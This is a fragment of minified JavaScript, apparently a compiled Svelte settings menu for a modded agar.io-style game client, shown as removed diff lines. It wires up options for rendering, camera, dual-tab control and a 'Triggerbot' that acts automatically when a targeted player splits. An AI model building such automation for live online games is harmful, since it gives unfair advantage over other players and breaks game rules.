x.ND4)("input"), tw = (0, x.xem)(), (tv = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show food', tb = (0, x.xem)(), ty = (0, x.ND4)("div"), tB = (0, x.ND4)("input"), tI = (0, x.xem)(), (tD = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show player animation', t2 = (0, x.xem)(), tN = (0, x.ND4)("div"), tE = (0, x.ND4)("input"), tk = (0, x.xem)(), (tT = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show ejected mass animation', tS = (0, x.xem)(), tY = (0, x.ND4)("div"), tz = (0, x.ND4)("input"), t5 = (0, x.xem)(), (t6 = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show player eaten animation', tM = (0, x.xem)(), tL = (0, x.ND4)("div"), (t1 = (0, x.ND4)("div")).innerHTML = '<span class="label s-vmzf1o">Tabs</span>', t9 = (0, x.xem)(), t3 = (0, x.ND4)("div"), tG = (0, x.ND4)("div"), t4 = (0, x.ND4)("input"), tH = (0, x.xem)(), (tU = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Use shared viewport', t7 = (0, x.xem)(), so && so.c(), tq = (0, x.xem)(), tW = (0, x.ND4)("div"), tK = (0, x.ND4)("input"), tJ = (0, x.xem)(), (tP = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Link tab names', tV = (0, x.xem)(), tZ = (0, x.ND4)("div"), tO = (0, x.ND4)("input"), x$ = (0, x.xem)(), (xe = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Link tab skins', xt = (0, x.xem)(), xx = (0, x.ND4)("div"), xs = (0, x.ND4)("input"), xn = (0, x.xem)(), (xa = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Link tab tags', xo = (0, x.xem)(), xr = (0, x.ND4)("div"), xl = (0, x.ND4)("input"), xh = (0, x.xem)(), (xA = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Tab control mode', xu = (0, x.xem)(), xd = (0, x.ND4)("div"), x0 = (0, x.ND4)("input"), xm = (0, x.xem)(), (xC = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Connect both tabs at once', xp = (0, x.xem)(), xf = (0, x.ND4)("div"), x_ = (0, x.ND4)("input"), xv = (0, x.xem)(), sr.c(), xy = (0, x.xem)(), xB = (0, x.ND4)("div"), (xF = (0, x.ND4)("div")).innerHTML = '<span class="label s-vmzf1o">Triggerbot</span>', xI = (0, x.xem)(), xD = (0, x.ND4)("div"), x2 = (0, x.ND4)("div"), xN = (0, x.ND4)("input"), xQ = (0, x.xem)(), xk = (0, x.ND4)("label"), xT = (0, x.ND4)("span"), xS = (0, x.xem)(), sl.c(), xz = (0, x.xem)(), sc && sc.c(), xR = (0, x.xem)(), x5 = (0, x.ND4)("div"), x6 = (0, x.Qq7)("Cells expected\r\n                    "), sh.c(), xL = (0, x.xem)(), x1 = (0, x.ND4)("input"), x3 = (0, x.xem)(), xG = (0, x.ND4)("div"), x4 = (0, x.ND4)("div"), xj = (0, x.ND4)("input"), xU = (0, x.xem)(), (x7 = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> HUD', xq = (0, x.xem)(), sA && sA.c(), (0, x.CFu)(u, "class", "label s-vmzf1o"), (0, x.CFu)(z, "class", "close button s-vmzf1o"), (0, x.CFu)(A, "class", "main-header s-vmzf1o"), (0, x.CFu)(j, "class", "label s-vmzf1o"), (0, x.CFu)(G, "class", "header s-vmzf1o"), (0, x.CFu)(J, "type", "checkbox"), (0, x.CFu)(J, "id", "use-anti-aliasing"), (0, x.CFu)(J, "data-name", "useAntialiasing"), (0, x.CFu)(J, "class", "s-vmzf1o"), (0, x.CFu)(Z, "for", "use-anti-aliasing"), (0, x.CFu)(Z, "class", "s-vmzf1o"), (0, x.CFu)(X, "class", "option s-vmzf1o"), (0, x.CFu)(X, "data-tip", "Enable for sharpness, performance is heavily impacted"), (0, x.CFu)($s, "type", "range"), (0, x.CFu)($s, "class", "range spacing s-vmzf1o"), (0, x.CFu)($s, "min", "0.5"), (0, x.CFu)($s, "max", "3"), (0, x.CFu)($s, "step", "0.05"), (0, x.CFu)($s, "data-name", "gameResolution"), (0, x.CFu)($$, "class", "option s-vmzf1o"), (0, x.CFu)($$, "data-tip", "Lower for performance, higher for sharpness"), (0, x.CFu)($c, "type", "range"), (0, x.CFu)($c, "class", "range spacing s-vmzf1o"), (0, x.CFu)($c, "min", "10"), (0, x.CFu)($c, "max", "60"), (0, x.CFu)($c, "step", "5"), (0, x.CFu)($c, "data-name", "smallTextThreshold"), (0, x.CFu)($a, "class", "option s-vmzf1o"), (0, x.CFu)($a, "data-tip", "Text on smaller cells will be hidden for performance"), (0, x.CFu)(q, "class", "content s-vmzf1o"), (0, x.CFu)(L, "class", "section s-vmzf1o"), (0, x.CFu)($0, "class", "label s-vmzf1o"), (0, x.CFu)($m, "class", "silent right s-vmzf1o"), (0, x.CFu)($d, "class", "header s-vmzf1o"), (0, x.CFu)($_, "type", "checkbox"), (0, x.CFu)($_, "id", "auto-zoom"), (0, x.CFu)($_, "data-name", "autoZoom"), (0, x.CFu)($_, "class", "s-vmzf1o"), (0, x.CFu)($b, "for", "auto-zoom"), (0, x.CFu)($b, "class", "s-vmzf1o"), (0, x.CFu)($f, "class", "option s-vmzf1o"), (0, x.CFu)($f, "data-tip", "Zooms out automatically as you gain mass"), (0, x.CFu)($F, "type", "checkbox"), (0, x.CFu)($F, "id", "remember-ejecting"), (0, x.CFu)($F, "data-name", "rememberEjecting"), (0, x.CFu)($F, "class", "s-vmzf1o"), (0, x.CFu)($2, "for", "remember-ejecting"), (0, x.hgi)($2, "margin-bottom", "3px"), (0, x.CFu)($2, "class", "s-vmzf1o"), (0, x.CFu)($B, "class", "option s-vmzf1o"), (0, x.CFu)($T, "type", "checkbox"), (0, x.CFu)($T, "id", "auto-respawn"), (0, x.CFu)($T, "data-name", "autoRespawn"), (0, x.CFu)($T, "class", "s-vmzf1o"), (0, x.CFu)($z, "for", "auto-respawn"), (0, x.CFu)($z, "class", "s-vmzf1o"), (0, x.CFu)($k, "class", "option s-vmzf1o"), (0, x.CFu)($k, "data-tip", "Automatically spawn each tabs upon death if the main menu isn't open"), (0, x.CFu)($6, "type", "checkbox"), (0, x.CFu)($6, "id", "soft-mouse-freeze"), (0, x.CFu)($6, "data-name", "mouseFreezeSoft"), (0, x.CFu)($6, "class", "s-vmzf1o"), (0, x.CFu)($1, "for", "soft-mouse-freeze"), (0, x.CFu)($1, "class", "s-vmzf1o"), (0, x.CFu)($5, "class", "option s-vmzf1o"), (0, x.CFu)($5, "data-tip", 'Moving your mouse cancels the "Freeze mouse" hotkey on the active tab if enabled'), (0, x.CFu)($G, "type", "checkbox"), (0, x.CFu)($G, "id", "delay-doublesplit"), (0, x.CFu)($G, "data-name", "delayDoublesplit"), (0, x.CFu)($G, "class", "s-vmzf1o"), (0, x.CFu)($H, "for", "delay-doublesplit"), (0, x.CFu)($H, "class", "s-vmzf1o"), (0, x.CFu)($3, "class", "option s-vmzf1o"), (0, x.CFu)($3, "data-tip", "Flicking may be more accurate if enabled"), (0, x.CFu)($X, "type", "range"), (0, x.CFu)($X, "class", "range spacing s-vmzf1o"), (0, x.CFu)($X, "min", "10"), (0, x.CFu)($X, "max", "300"), (0, x.CFu)($X, "step", "5"), (0, x.CFu)($X, "data-name", "drawDelay"), (0, x.CFu)($7, "class", "option s-vmzf1o"), (0, x.CFu)($7, "data-tip", "Lower is more responsive, higher is smoother"), (0, x.CFu)(e$, "type", "range"), (0, x.CFu)(e$, "class", "range spacing s-vmzf1o"), (0, x.CFu)(e$, "min", "10"), (0, x.CFu)(e$, "max", "1000"), (0, x.CFu)(e$, "step", "10"), (0, x.CFu)(e$, "data-name", "cameraMoveDelay"), (0, x.CFu)($V, "class", "option s-vmzf1o"), (0, x.CFu)($V, "data-tip", "How fast the camera follows your tab(s) while moving"), (0, x.CFu)(ea, "type", "range"), (0, x.CFu)(ea, "class", "range spacing s-vmzf1o"), (0, x.CFu)(ea, "min", "10"), (0, x.CFu)(ea, "max", "1000"), (0, x.CFu)(ea, "step", "10"), (0, x.CFu)(ea, "data-name", "cameraSwitchDelay"), (0, x.CFu)(ex, "class", "option s-vmzf1o"), (0, x.CFu)(ex, "data-tip", "How fast the camera moves to your active tab upon tab switching"), (0, x.CFu)(eu, "type", "range"), (0, x.CFu)(eu, "class", "range spacing s-vmzf1o"), (0, x.CFu)(eu, "min", "10"), (0, x.CFu)(eu, "max", "1000"), (0, x.CFu)(eu, "step", "10"), (0, x.CFu)(eu, "data-name", "cameraZoomDelay"), (0, x.CFu)(el, "class", "option s-vmzf1o"), (0, x.CFu)(el, "data-tip", "How fast the camera is zoomed in/out upon user input"), (0, x.CFu)(ef, "type", "range"), (0, x.CFu)(ef, "class", "range spacing s-vmzf1o"), (0, x.CFu)(ef, "min", "1"), (0, x.CFu)(ef, "max", "20"), (0, x.CFu)(ef, "step", "1"), (0, x.CFu)(ef, "data-name", "cameraZoomSpeed"), (0, x.CFu)(eg, "class", "option s-vmzf1o"), (0, x.CFu)(eg, "data-tip", "Responsiveness for zooming with scroll-wheel"), (0, x.CFu)(eF, "type", "range"), (0, x.CFu)(eF, "class", "range spacing s-vmzf1o"), (0, x.CFu)(eF, "min", "300"), (0, x.CFu)(eF, "max", "5000"), (0, x.CFu)(eF, "step", "50"), (0, x.CFu)(eF, "data-name", "lineSplitDelay"), (0, x.CFu)(ev, "class", "option s-vmzf1o"), (0, x.CFu)(ev, "data-tip", 'Delay for automatically disabling "Freeze mouse" after line-splitting'), (0, x.CFu)($p, "class", "content s-vmzf1o"), (0, x.CFu)($u, "class", "section s-vmzf1o"), (0, x.CFu)(eN, "class", "header s-vmzf1o"), (0, x.CFu)(ez, "type", "range"), (0, x.CFu)(ez, "class", "range spacing s-vmzf1o"), (0, x.CFu)(ez, "min", "0.1"), (0, x.CFu)(ez, "max", "1"), (0, x.CFu)(ez, "step", "0.05"), (0, x.CFu)(ez, "data-name", "cellsOpacity"), (0, x.CFu)(ek, "class", "row spacing s-vmzf1o"), (0, x.CFu)(ek, "data-tip", "How opaque cells in-game are"), (0, x.CFu)(eM, "type", "range"), (0, x.CFu)(eM, "class", "left range s-vmzf1o"), (0, x.CFu)(eM, "min", "0"), (0, x.CFu)(eM, "max", "2"), (0, x.CFu)(eM, "step", "1"), (0, x.CFu)(eM, "data-name", "showNames"), (0, x.CFu)(e6, "class", "inline-row s-vmzf1o"), (0, x.CFu)(e4, "type", "range"), (0, x.CFu)(e4, "class", "left range s-vmzf1o"), (0, x.CFu)(e4, "min", "0"), (0, x.CFu)(e4, "max", "2"), (0, x.CFu)(e4, "step", "1"), (0, x.CFu)(e4, "data-name", "showSkins"), (0, x.CFu)(eG, "class", "inline-row s-vmzf1o"), (0, x.CFu)(eW, "type", "range"), (0, x.CFu)(eW, "class", "left range s-vmzf1o"), (0, x.CFu)(eW, "min", "0"), (0, x.CFu)(eW, "max", "2"), (0, x.CFu)(eW, "step", "1"), (0, x.CFu)(eW, "data-name", "showMass"), (0, x.CFu)(eq, "class", "inline-row s-vmzf1o"), (0, x.CFu)(eZ, "type", "checkbox"), (0, x.CFu)(eZ, "id", "show-own-name"), (0, x.CFu)(eZ, "data-name", "showOwnName"), (0, x.CFu)(eZ, "class", "s-vmzf1o"), (0, x.CFu)(t$, "for", "show-own-name"), (0, x.CFu)(t$, "class", "s-vmzf1o"), (0, x.CFu)(eV, "class", "option s-vmzf1o"), (0, x.CFu)(tx, "type", "checkbox"), (0, x.CFu)(tx, "id", "show-own-skin"), (0, x.CFu)(tx, "data-name", "showOwnSkin"), (0, x.CFu)(tx, "class", "s-vmzf1o"), (0, x.CFu)(tn, "for", "show-own-skin"), (0, x.CFu)(tn, "class", "s-vmzf1o"), (0, x.CFu)(tt, "class", "option s-vmzf1o"), (0, x.CFu)(tr, "type", "checkbox"), (0, x.CFu)(tr, "id", "show-own-mass"), (0, x.CFu)(tr, "data-name", "showOwnMass"), (0, x.CFu)(tr, "class", "s-vmzf1o"), (0, x.CFu)(th, "for", "show-own-mass"), (0, x.CFu)(th, "class", "s-vmzf1o"), (0, x.CFu)(to, "class", "option s-vmzf1o"), (0, x.CFu)(td, "type", "checkbox"), (0, x.CFu)(td, "id", "show-crown"), (0, x.CFu)(td, "data-name", "showCrown"), (0, x.CFu)(td, "class", "s-vmzf1o"), (0, x.CFu)(tm, "for", "show-crown"), (0, x.CFu)(tm, "class", "s-vmzf1o"), (0, x.CFu)(tu, "class", "option s-vmzf1o"), (0, x.CFu)(tf, "type", "checkbox"), (0, x.CFu)(tf, "id", "show-food"), (0, x.CFu)(tf, "data-name", "foodVisible"), (0, x.CFu)(tf, "class", "s-vmzf1o"), (0, x.CFu)(tv, "for", "show-food"), (0, x.CFu)(tv, "class", "s-vmzf1o"), (0, x.CFu)(tp, "class", "option s-vmzf1o"), (0, x.CFu)(tB, "type", "checkbox"), (0, x.CFu)(tB, "id", "show-player-animation"), (0, x.CFu)(tB, "data-name", "animatePlayerCells"), (0, x.CFu)(tB, "class", "s-vmzf1o"), (0, x.CFu)(tD, "for", "show-player-animation"), (0, x.CFu)(tD, "class", "s-vmzf1o"), (0, x.CFu)(ty, "class", "option s-vmzf1o"), (0, x.CFu)(tE, "type", "checkbox"), (0, x.CFu)(tE, "id", "show-ejected-animation"), (0, x.CFu)(tE, "data-name", "animateEjectedCells"), (0, x.CFu)(tE, "class", "s-vmzf1o"), (0, x.CFu)(tT, "for", "show-ejected-animation"), (0, x.CFu)(tT, "class", "s-vmzf1o"), (0, x.CFu)(tN, "class", "option s-vmzf1o"), (0, x.CFu)(tz, "type", "checkbox"), (0, x.CFu)(tz, "id", "show-eat-animation"), (0, x.CFu)(tz, "data-name", "eatAnimation"), (0, x.CFu)(tz, "class", "s-vmzf1o"), (0, x.CFu)(t6, "for", "show-eat-animation"), (0, x.CFu)(t6, "class", "s-vmzf1o"), (0, x.CFu)(tY, "class", "option s-vmzf1o"), (0, x.CFu)(eQ, "class", "content s-vmzf1o"), (0, x.CFu)(e2, "class", "section s-vmzf1o"), (0, x.CFu)(t1, "class", "header s-vmzf1o"), (0, x.CFu)(t4, "type", "checkbox"), (0, x.CFu)(t4, "id", "use-shared-viewport"), (0, x.CFu)(t4, "data-name", "useSharedViewport"), (0, x.CFu)(t4, "class", "s-vmzf1o"), (0, x.CFu)(tU, "for", "use-shared-viewport"), (0, x.CFu)(tU, "class", "s-vmzf1o"), (0, x.CFu)(tG, "class", "option s-vmzf1o"), (0, x.CFu)(tG, "data-tip", "When in range, tabs will share the same viewport"), (0, x.CFu)(tK, "type", "checkbox"), (0, x.CFu)(tK, "id", "link-tab-names"), (0, x.CFu)(tK, "data-name", "linkTabNames"), (0, x.CFu)(tK, "class", "s-vmzf1o"), (0, x.CFu)(tP, "for", "link-tab-names"), (0, x.CFu)(tP, "class", "s-vmzf1o"), (0, x.CFu)(tW, "class", "option s-vmzf1o"), (0, x.CFu)(tW, "data-tip", "When enabled, tabs will share the same name"), (0, x.CFu)(tO, "type", "checkbox"), (0, x.CFu)(tO, "id", "link-tab-skins"), (0, x.CFu)(tO, "data-name", "linkTabSkins"), (0, x.CFu)(tO, "class", "s-vmzf1o"), (0, x.CFu)(xe, "for", "link-tab-skins"), (0, x.CFu)(xe, "class", "s-vmzf1o"), (0, x.CFu)(tZ, "class", "option s-vmzf1o"), (0, x.CFu)(tZ, "data-tip", "When enabled, tabs will share the same skin"), (0, x.CFu)(xs, "type", "checkbox"), (0, x.CFu)(xs, "id", "link-tab-tags"), (0, x.CFu)(xs, "data-name", "linkTabTags"), (0, x.CFu)(xs, "class", "s-vmzf1o"), (0, x.CFu)(xa, "for", "link-tab-tags"), (0, x.CFu)(xa, "class", "s-vmzf1o"), (0, x.CFu)(xx, "class", "option s-vmzf1o"), (0, x.CFu)(xx, "data-tip", "When enabled, tabs will share the same tag"), (0, x.CFu)(xl, "type", "checkbox"), (0, x.CFu)(xl, "id", "switch-control-mode"), (0, x.CFu)(xl, "data-name", "switchControlMode"), (0, x.CFu)(xl, "class", "s-vmzf1o"), (0, x.CFu)(xA, "for", "switch-control-mode"), (0, x.CFu)(xA, "class", "s-vmzf1o"), (0, x.CFu)(xr, "class", "option s-vmzf1o"), (0, x.CFu)(xr, "data-tip", "When enabled, your inactive tab will always follow your mouse with its own set of hotkeys"), (0, x.CFu)(x0, "type", "checkbox"), (0, x.CFu)(x0, "id", "join-tabs-together"), (0, x.CFu)(x0, "data-name", "joinTabsTogether"), (0, x.CFu)(x0, "class", "s-vmzf1o"), (0, x.CFu)(xC, "for", "join-tabs-together"), (0, x.CFu)(xC, "class", "s-vmzf1o"), (0, x.CFu)(xd, "class", "option s-vmzf1o"), (0, x.CFu)(xd, "data-tip", "Both of your tabs will join the server at the same time whenever you join a server"), (0, x.CFu)(x_, "type", "range"), (0, x.CFu)(x_, "class", "left range s-vmzf1o"), (0, x.CFu)(x_, "min", "0"), (0, x.CFu)(x_, "max", "2"), (0, x.CFu)(x_, "step", "1"), (0, x.CFu)(x_, "data-name", "tabStatusMode"), (0, x.CFu)(xf, "class", "inline-row spacing s-vmzf1o"), (0, x.CFu)(xf, "data-tip", "What mode to show whether or not your tab is focused or not"), (0, x.CFu)(t3, "class", "content s-vmzf1o"), (0, x.CFu)(tL, "class", "section s-vmzf1o"), (0, x.CFu)(xF, "class", "header s-vmzf1o"), (0, x.CFu)(xN, "type", "checkbox"), (0, x.CFu)(xN, "id", "ignore-size-enabled"), (0, x.CFu)(xN, "data-name", "triggerIgnoreSizeEnabled"), (0, x.CFu)(xN, "class", "s-vmzf1o"), (0, x.CFu)(xT, "class", "s-vmzf1o"), (0, x.CFu)(xk, "for", "ignore-size-enabled"), (0, x.CFu)(xk, "class", "s-vmzf1o"), (0, x.CFu)(x2, "class", "option s-vmzf1o"), (0, x.CFu)(x2, "data-tip", "Whether or not to ignore new cells when their mass is below the specified threshold"), (0, x.CFu)(x1, "type", "range"), (0, x.CFu)(x1, "class", "range spacing s-vmzf1o"), (0, x.CFu)(x1, "min", "1"), (0, x.CFu)(x1, "max", "256"), (0, x.CFu)(x1, "step", "1"), (0, x.CFu)(x1, "data-name", "triggerAtCells"), (0, x.CFu)(x5, "class", "option spacing s-vmzf1o"), (0, x.CFu)(x5, "data-tip", "The number of cells the targeted player needs to produce for the triggerbot to trigger"), (0, x.CFu)(xD, "class", "content s-vmzf1o"), (0, x.CFu)(xB, "class", "section s-vmzf1o"), (0, x.CFu)(xj, "type", "checkbox"), (0, x.CFu)(xj, "id", "show-hud"), (0, x.CFu)(xj, "data-name", "showHud"), (0, x.CFu)(xj, "class", "s-vmzf1o"), (0, x.CFu)(x7, "for", "show-hud"), (0, x.hgi)(x7, "flex", "1"), (0, x.CFu)(x7, "class", "s-vmzf1o"), (0, x.CFu)(x4, "class", "header s-vmzf1o"), (0, x.goL)(x4, "disabled", !$[6]), (0, x.CFu)(xG, "class", "section s-vmzf1o"), (0, x.CFu)(M, "class", "sections s-vmzf1o"), (0, x.CFu)(c, "class", "inner-content s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, c, t), (0, x.BCw)(c, A), (0, x.BCw)(A, u), (0, x.BCw)(A, E), (0, x.BCw)(A, z), (0, x.BCw)(c, R), (0, x.BCw)(c, M), (0, x.BCw)(M, L), (0, x.BCw)(L, G), (0, x.BCw)(G, j), (0, x.BCw)(G, H), xX.m(G, null), (0, x.BCw)(L, U), (0, x.BCw)(L, q), xJ && xJ.m(q, null), (0, x.BCw)(q, K), (0, x.BCw)(q, X), (0, x.BCw)(X, J), (0, x.BCw)(X, V), (0, x.BCw)(X, Z), (0, x.BCw)(q, O), (0, x.BCw)(q, $$), (0, x.BCw)($$, $e), xP.m($$, null), (0, x.BCw)($$, $x), (0, x.BCw)($$, $s), (0, x.BCw)(q, $n), (0, x.BCw)(q, $a), (0, x.BCw)($a, $o), xV.m($a, null), (0, x.BCw)($a, $l), (0, x.BCw)($a, $c), (0, x.BCw)(M, $A), (0, x.BCw)(M, $u), (0, x.BCw)($u, $d), (0, x.BCw)($d, $0), (0, x.BCw)($d, $g), (0, x.BCw)($d, $m), (0, x.BCw)($u, $C), (0, x.BCw)($u, $p), (0, x.BCw)($p, $f), (0, x.BCw)($f, $_), (0, x.BCw)($f, $v), (0, x.BCw)($f, $b), (0, x.BCw)($p, $y), (0, x.BCw)($p, $B), (0, x.BCw)($B, $F), (0, x.BCw)($B, $D), (0, x.BCw)($B, $2), (0, x.BCw)($B, $N), xZ.m($B, null), (0, x.BCw)($p, $Q), (0, x.BCw)($p, $k), (0, x.BCw)($k, $T), (0, x.BCw)($k, $Y), (0, x.BCw)($k, $z), (0, x.BCw)($p, $R), (0, x.BCw)($p, $5), (0, x.BCw)($5, $6), (0, x.BCw)($5, $L), (0, x.BCw)($5, $1), (0, x.BCw)($p, $9), (0, x.BCw)($p, $3), (0, x.BCw)($3, $G), (0, x.BCw)($3, $j), (0, x.BCw)($3, $H), (0, x.BCw)($p, $U), (0, x.BCw)($p, $7), (0, x.BCw)($7, $q), xO.m($7, null), (0, x.BCw)($7, $K), (0, x.BCw)($7, $X), (0, x.BCw)($p, $P), (0, x.BCw)($p, $V), (0, x.BCw)($V, $Z), x8.m($V, null), (0, x.BCw)($V, $8), (0, x.BCw)($V, e$), (0, x.BCw)($p, et), (0, x.BCw)($p, ex), (0, x.BCw)(ex, es), s$.m(ex, null), (0, x.BCw)(ex, en), (0, x.BCw)(ex, ea), (0, x.BCw)($p, er), (0, x.BCw)($p, el), (0, x.BCw)(el, ec), se.m(el, null), (0, x.BCw)(el, eA), (0, x.BCw)(el, eu), (0, x.BCw)($p, e0), (0, x.BCw)($p, eg), (0, x.BCw)(eg, em), st.m(eg, null), (0, x.BCw)(eg, ep), (0, x.BCw)(eg, ef), (0, x.BCw)($p, ew), (0, x.BCw)($p, ev), (0, x.BCw)(ev, eb), sx.m(ev, null), (0, x.BCw)(ev, eB), (0, x.BCw)(ev, eF), (0, x.BCw)(M, eD), (0, x.BCw)(M, e2), (0, x.BCw)(e2, eN), (0, x.BCw)(e2, eE), (0, x.BCw)(e2, eQ), (0, x.BCw)(eQ, ek), (0, x.BCw)(ek, eT), ss.m(ek, null), (0, x.BCw)(ek, eY), (0, x.BCw)(ek, ez), (0, x.BCw)(eQ, e5), (0, x.BCw)(eQ, e6), (0, x.BCw)(e6, eM), (0, x.BCw)(e6, e1), si.m(e6, null), (0, x.BCw)(eQ, e3), (0, x.BCw)(eQ, eG), (0, x.BCw)(eG, e4), (0, x.BCw)(eG, eH), sn.m(eG, null), (0, x.BCw)(eQ, e7), (0, x.BCw)(eQ, eq), (0, x.BCw)(eq, eW), (0, x.BCw)(eq, eX), sa.m(eq, null), (0, x.BCw)(eQ, eP), (0, x.BCw)(eQ, eV), (0, x.BCw)(eV, eZ), (0, x.BCw)(eV, e8), (0, x.BCw)(eV, t$), (0, x.BCw)(eQ, te), (0, x.BCw)(eQ, tt), (0, x.BCw)(tt, tx), (0, x.BCw)(tt, ti), (0, x.BCw)(tt, tn), (0, x.BCw)(eQ, ta), (0, x.BCw)(eQ, to), (0, x.BCw)(to, tr), (0, x.BCw)(to, tc), (0, x.BCw)(to, th), (0, x.BCw)(eQ, tA), (0, x.BCw)(eQ, tu), (0, x.BCw)(tu, td), (0, x.BCw)(tu, tg), (0, x.BCw)(tu, tm), (0, x.BCw)(eQ, tC), (0, x.BCw)(eQ, tp), (0, x.BCw)(tp, tf), (0, x.BCw)(tp, tw), (0, x.BCw)(tp, tv), (0, x.BCw)(eQ, tb), (0, x.BCw)(eQ, ty), (0, x.BCw)(ty, tB), (0, x.BCw)(ty, tI), (0, x.BCw)(ty, tD), (0, x.BCw)(eQ, t2), (0, x.BCw)(eQ, tN), (0, x.BCw)(tN, tE), (0, x.BCw)(tN, tk), (0, x.BCw)(tN, tT), (0, x.BCw)(eQ, tS), (0, x.BCw)(eQ, tY), (0, x.BCw)(tY, tz), (0, x.BCw)(tY, t5), (0, x.BCw)(tY, t6), (0, x.BCw)(M, tM), (0, x.BCw)(M, tL), (0, x.BCw)(tL, t1), (0, x.BCw)(tL, t9), (0, x.BCw)(tL, t3), (0, x.BCw)(t3, tG), (0, x.BCw)(tG, t4), (0, x.BCw)(tG, tH), (0, x.BCw)(tG, tU), (0, x.BCw)(t3, t7), so && so.m(t3, null), (0, x.BCw)(t3, tq), (0, x.BCw)(t3, tW), (0, x.BCw)(tW, tK), (0, x.BCw)(tW, tJ), (0, x.BCw)(tW, tP), (0, x.BCw)(t3, tV), (0, x.BCw)(t3, tZ), (0, x.BCw)(tZ, tO), (0, x.BCw)(tZ, x$), (0, x.BCw)(tZ, xe), (0, x.BCw)(t3, xt), (0, x.BCw)(t3, xx), (0, x.BCw)(xx, xs), (0, x.BCw)(xx, xn), (0, x.BCw)(xx, xa), (0, x.BCw)(t3, xo), (0, x.BCw)(t3, xr), (0, x.BCw)(xr, xl), (0, x.BCw)(xr, xh), (0, x.BCw)(xr, xA), (0, x.BCw)(t3, xu), (0, x.BCw)(t3, xd), (0, x.BCw)(xd, x0), (0, x.BCw)(xd, xm), (0, x.BCw)(xd, xC), (0, x.BCw)(t3, xp), (0, x.BCw)(t3, xf), (0, x.BCw)(xf, x_), (0, x.BCw)(xf, xv), sr.m(xf, null), (0, x.BCw)(M, xy), (0, x.BCw)(M, xB), (0, x.BCw)(xB, xF), (0, x.BCw)(xB, xI), (0, x.BCw)(xB, xD), (0, x.BCw)(xD, x2), (0, x.BCw)(x2, xN), (0, x.BCw)(x2, xQ), (0, x.BCw)(x2, xk), (0, x.BCw)(xk, xT), (0, x.BCw)(xk, xS), sl.m(xk, null), (0, x.BCw)(xD, xz), sc && sc.m(xD, null), (0, x.BCw)(xD, xR), (0, x.BCw)(xD, x5), (0, x.BCw)(x5, x6), sh.m(x5, null), (0, x.BCw)(x5, xL), (0, x.BCw)(x5, x1), (0, x.BCw)(M, x3), (0, x.BCw)(M, xG), (0, x.BCw)(xG, x4), (0, x.BCw)(x4, xj), (0, x.BCw)(x4, xU), (0, x.BCw)(x4, x7), (0, x.BCw)(xG, xq), sA && sA.m(xG, null), xW || (xK = [(0, x.KTR)(z, "click", $[17]), (0, x.KTR)(J, "change", $[12]), (0, x.hGc)(P = $[13].call(null, J)), (0, x.KTR)($s, "input", $[12]), (0, x.KTR)($s, "change", $[18]), (0, x.hGc)($i = $[13].call(null, $s)), (0, x.KTR)($c, "input", $[12]), (0, x.hGc)($h = $[13].call(null, $c)), (0, x.KTR)($_, "change", $[12]), (0, x.hGc)($w = $[13].call(null, $_)), (0, x.KTR)($F, "change", $[12]), (0, x.hGc)($I = $[13].call(null, $F)), (0, x.KTR)($T, "change", $[12]), (0, x.hGc)($S = $[13].call(null, $T)), (0, x.KTR)($6, "change", $[12]), (0, x.hGc)($M = $[13].call(null, $6)), (0, x.KTR)($G, "change", $[12]), (0, x.hGc)($4 = $[13].call(null, $G)), (0, x.KTR)($X, "input", $[12]), (0, x.hGc)($J = $[13].call(null, $X)), (0, x.KTR)(e$, "input", $[12]), (0, x.hGc)(ee = $[13].call(null, e$)), (0, x.KTR)(ea, "input", $[12]), (0, x.hGc)(eo = $[13].call(null, ea)), (0, x.KTR)(eu, "input", $[12]), (0, x.hGc)(ed = $[13].call(null, eu)), (0, x.KTR)(ef, "input", $[12]), (0, x.hGc)(e_ = $[13].call(null, ef)), (0, x.KTR)(eF, "input", $[12]), (0, x.hGc)(eI = $[13].call(null, eF)), (0, x.KTR)(ez, "input", $[12]), (0, x.hGc)(eR = $[13].call(null, ez)), (0, x.KTR)(eM, "input", $[12]), (0, x.hGc)(eL = $[13].call(null, eM)), (0, x.KTR)(e4, "input", $[12]), (0, x.hGc)(ej = $[13].call(null, e4)), (0, x.KTR)(eW, "input", $[12]), (0, x.hGc)(eK = $[13].call(null, eW)), (0, x.KTR)(eZ, "change", $[12]), (0, x.hGc)(eO = $[13].call(null, eZ)), (0, x.KTR)(tx, "change", $[12]), (0, x.hGc)(ts = $[13].call(null, tx)), (0, x.KTR)(tr, "change", $[12]), (0, x.hGc)(tl = $[13].call(null, tr)), (0, x.KTR)(td, "change", $[12]), (0, x.hGc)(t0 = $[13].call(null, td)), (0, x.KTR)(tf, "change", $[12]), (0, x.hGc)(t_ = $[13].call(null, tf)), (0, x.KTR)(tB, "change", $[12]), (0, x.hGc)(tF = $[13].call(null, tB)), (0, x.KTR)(tE, "change", $[12]), (0, x.hGc)(tQ = $[13].call(null, tE)), (0, x.KTR)(tz, "change", $[12]), (0, x.hGc)(tR = $[13].call(null, tz)), (0, x.KTR)(t4, "change", $[12]), (0, x.hGc)(tj = $[13].call(null, t4)), (0, x.KTR)(tK, "change", $[12]), (0, x.hGc)(tX = $[13].call(null, tK)), (0, x.KTR)(tO, "change", $[12]), (0, x.hGc)(t8 = $[13].call(null, tO)), (0, x.KTR)(xs, "change", $[12]), (0, x.hGc)(xi = $[13].call(null, xs)), (0, x.KTR)(xl, "change", $[12]), (0, x.hGc)(xc = $[13].call(null, xl)), (0, x.KTR)(x0, "change", $[12]), (0, x.hGc)(xg = $[13].call(null, x0)), (0, x.KTR)(x_, "input", $[12]), (0, x.hGc)(xw = $[13].call(null, x_)), (0, x.KTR)(xN, "change", $[12]), (0, x.hGc)(xE = $[13].call(null, xN)), (0, x.KTR)(x1, "input", $[12]), (0, x.hGc)(x9 = $[13].call(null, x1)), (0, x.KTR)(xj, "change", $[12]), (0, x.hGc)(xH = $[13].call(null, xj))], xW = !0)
-                        },
